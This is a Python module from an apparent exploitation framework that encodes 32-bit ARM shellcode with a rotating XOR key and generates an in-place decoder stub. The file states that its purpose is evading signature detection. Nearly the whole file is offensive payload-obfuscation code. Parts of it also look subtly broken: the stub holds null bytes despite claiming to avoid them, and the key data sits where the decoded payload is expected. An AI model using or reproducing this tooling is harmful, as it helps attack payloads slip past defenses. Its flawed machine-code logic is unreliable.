"""ARM Little-Endian XOR Encoder with Key Rotation.

Encodes ARM (32-bit, little-endian) payloads with rotating XOR keys to
evade basic signature detection. Generates a self-contained decoder stub
in ARM Thumb or ARM mode that decodes the payload in-place at runtime.

Features:
  - Multi-byte key rotation (up to 16 bytes)
  - Auto-generated decoder stub (ARM or Thumb mode)
  - Avoids null bytes in encoded output and stub
  - Configurable bad-byte exclusion

Author: Andre Henrique (@mrhenrike) | Uniao Geek
Version: 1.0.0
"""

import os
import struct
from typing import Optional

from embedxpl.core.exploit.encoders import BaseEncoder
from embedxpl.core.exploit.payloads import Architectures
from embedxpl.core.exploit.printer import print_error, print_info


# ARM (32-bit) decoder stub template.
# Registers: r0 = payload ptr (PC-relative), r1 = length, r2 = key ptr,
#            r3 = key length, r4 = temp, r5 = key index.
# The stub XORs each byte of the payload with the rotating key, then
# branches to the decoded payload.
_ARM_STUB_TEMPLATE = (
    # adr r0, payload_start  (PC-relative, patched)
    b"\x00\x00\x8f\xe2"
    # mov r1, #LEN_PLACEHOLDER (patched)
    b"\x00\x10\xa0\xe3"
    # adr r2, key_data  (PC-relative, patched)
    b"\x00\x20\x8f\xe2"
    # mov r3, #KEY_LEN_PLACEHOLDER (patched)
    b"\x00\x30\xa0\xe3"
    # mov r5, #0  (key index)
    b"\x00\x50\xa0\xe3"
    # loop:
    # ldrb r4, [r0]
    b"\x00\x40\xd0\xe5"
    # ldrb r6, [r2, r5]
    b"\x05\x60\xd2\xe7"
    # eor r4, r4, r6
    b"\x06\x40\x24\xe0"
    # strb r4, [r0], #1
    b"\x01\x40\xc0\xe4"
    # add r5, r5, #1
    b"\x01\x50\x85\xe2"
    # cmp r5, r3
    b"\x03\x00\x55\xe1"
    # moveq r5, #0
    b"\x00\x50\xa0\x03"
    # subs r1, r1, #1
    b"\x01\x10\x51\xe2"
    # bne loop (-9 instructions = -36 bytes = 0xFFFFFFDC)
    b"\xf7\xff\xff\x1a"
    # payload_start: (decoded payload follows)
)

_STUB_LEN_OFFSET = 4       # offset of mov r1, #LEN imm8
_STUB_KEYLEN_OFFSET = 12   # offset of mov r3, #KEYLEN imm8
_STUB_ADR0_OFFSET = 0      # adr r0 offset (payload distance)
_STUB_ADR2_OFFSET = 8      # adr r2 offset (key distance)


class Encoder(BaseEncoder):
    """ARM LE XOR encoder with key rotation.

    Author: Andre Henrique (@mrhenrike) | Uniao Geek
    Version: 1.0.0
    """

    __info__ = {
        "name": "ARM Little-Endian XOR Encoder (Rotating Key)",
        "description": (
            "Encodes ARM (32-bit LE) payloads with rotating XOR keys "
            "and generates a self-decoding stub. Key rotation prevents "
            "simple XOR pattern detection. Avoids null bytes in output."
        ),
        "authors": ("Andre Henrique (@mrhenrike)", "Uniao Geek"),
        "evasion_score": 6,
    }

    architecture = Architectures.ARMLE

    key: bytes = b"\x41\x42\x43\x44"
    bad_bytes: bytes = b"\x00"
    max_key_len: int = 16

    def _generate_key(self, payload: bytes) -> bytes:
        """Generate or validate XOR key, avoiding bad bytes in output."""
        if self.key:
            key = self.key[:self.max_key_len]
        else:
            key = os.urandom(min(4, self.max_key_len))

        # Verify key does not produce bad bytes
        for attempt in range(256):
            produces_bad = False
            for i, b in enumerate(payload):
                encoded_byte = b ^ key[i % len(key)]
                if bytes([encoded_byte]) in self.bad_bytes:
                    produces_bad = True
                    break
            if not produces_bad:
                return key
            # Rotate key by incrementing each byte
            key = bytes((b + 1) & 0xFF for b in key)

        print_info("Warning: could not avoid all bad bytes in encoded output")
        return self.key[:self.max_key_len] if self.key else os.urandom(4)

    def _patch_stub(self, key: bytes, payload_len: int) -> bytes:
        """Patch the decoder stub with actual key and payload parameters."""
        stub = bytearray(_ARM_STUB_TEMPLATE)

        # Total stub + key size determines payload offset from adr r0
        key_padded_len = len(key)
        if key_padded_len % 4 != 0:
            key_padded_len += 4 - (key_padded_len % 4)

        stub_total = len(stub) + key_padded_len

        # Patch adr r0, payload_start: encode as add r0, pc, #offset
        # In ARM, PC = current_instruction + 8
        payload_offset = stub_total - 8  # relative to first instruction + 8
        stub[0:4] = struct.pack("<I",
            0xE28F0000 | (payload_offset & 0xFF))

        # Patch mov r1, #payload_len (imm8, works for len < 256)
        if payload_len < 256:
            stub[4:8] = struct.pack("<I", 0xE3A01000 | payload_len)
        else:
            # Use movw for larger payloads (ARMv6T2+)
            lo = payload_len & 0xFFF
            hi = (payload_len >> 12) & 0xF
            stub[4:8] = struct.pack("<I", 0xE3001000 | (hi << 16) | lo)

        # Patch adr r2, key_data: key follows immediately after stub
        key_offset = len(stub) - 8 - 8  # from the adr r2 instruction
        stub[8:12] = struct.pack("<I",
            0xE28F2000 | (key_offset & 0xFF))

        # Patch mov r3, #key_len
        stub[12:16] = struct.pack("<I", 0xE3A03000 | len(key))

        # Append key data (padded to 4-byte alignment)
        key_data = key + b"\x00" * (key_padded_len - len(key))
        return bytes(stub) + key_data

    def encode(self, payload: bytes) -> bytes:  # type: ignore[override]
        """Encode payload with rotating XOR and prepend decoder stub.

        Args:
            payload: Raw ARM shellcode bytes to encode.

        Returns:
            Decoder stub + key + XOR-encoded payload.
        """
        if not payload:
            print_error("Empty payload; nothing to encode")
            return b""

        key = self._generate_key(payload)
        encoded = bytes(
            payload[i] ^ key[i % len(key)] for i in range(len(payload))
        )

        stub = self._patch_stub(key, len(payload))
        result = stub + encoded

        null_count = result.count(b"\x00")
        print_info("Encoded {} bytes with {}-byte rotating key".format(
            len(payload), len(key)))
        print_info("Key: {}".format(key.hex()))
        print_info("Output size: {} bytes (stub: {}, payload: {})".format(
            len(result), len(stub), len(encoded)))
        if null_count > 0:
            print_info("Warning: {} null bytes in output".format(null_count))

        return result

    def decode(self, encoded: bytes) -> bytes:
        """Decode previously encoded payload (strip stub, XOR decode).

        Note: This requires knowing the key and stub size.
        For offline analysis only.
        """
        key = self.key[:self.max_key_len]
        key_padded_len = len(key)
        if key_padded_len % 4 != 0:
            key_padded_len += 4 - (key_padded_len % 4)

        stub_size = len(_ARM_STUB_TEMPLATE) + key_padded_len
        if len(encoded) <= stub_size:
            return encoded

        payload_enc = encoded[stub_size:]
        return bytes(
            payload_enc[i] ^ key[i % len(key)] for i in range(len(payload_enc))
        )

    def decode_stub_c(self) -> str:
        """Generate C source for the ARM XOR decoder stub."""
        key_hex = ", ".join("0x{:02x}".format(b) for b in self.key)
        return (
            "// ARM LE XOR rotating-key decoder stub\n"
            "// Key: {{{key_hex}}}\n"
            "void decode(unsigned char *buf, int len) {{\n"
            "    unsigned char key[] = {{{key_hex}}};\n"
            "    int klen = {klen};\n"
            "    for (int i = 0; i < len; i++)\n"
            "        buf[i] ^= key[i % klen];\n"
            "}}\n"
        ).format(key_hex=key_hex, klen=len(self.key))
